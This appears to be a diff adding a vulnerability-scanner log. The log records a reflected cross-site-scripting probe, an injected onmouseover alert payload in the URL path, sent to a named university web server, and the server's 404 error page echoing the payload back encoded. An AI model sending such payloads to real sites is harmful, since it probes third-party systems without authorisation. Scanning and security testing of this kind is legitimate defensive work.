@@ -1,0 +1,24 @@
+[mamp-server-xss] Dumped HTTP request for https://edtech.le.unimelb.edu.au/index.php/test"+onmouseover="alert(document.domain);"+style="font-size:100000px;background-color:white";
+
+
+GET /index.php/test%22%20onmouseover=%22alert%28document.domain%29;%22%20style=%22font-size:100000px;background-color:white%22; HTTP/1.1
+Host: edtech.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[mamp-server-xss] Dumped HTTP response https://edtech.le.unimelb.edu.au/index.php/test"+onmouseover="alert(document.domain);"+style="font-size:100000px;background-color:white";
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 1187
+Content-Type: text/html;charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:32 GMT
+Server: Apache
+Set-Cookie: BIGipServer~app_047s-prod_prod~pool_047s-prod_prod=851842988.47873.0000; path=/; Httponly; Secure
+Strict-Transport-Security: max-age=63072000; preload
+
+<html><head><title>Apache Tomcat/6.0.53 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /index.php/test%22%20onmouseover=%22alert(document.domain);%22%20style=%22font-size:100000px;background-color:white%22;</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/index.php/test%22%20onmouseover=%22alert(document.domain);%22%20style=%22font-size:100000px;background-color:white%22;</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.53</h3></body></html>
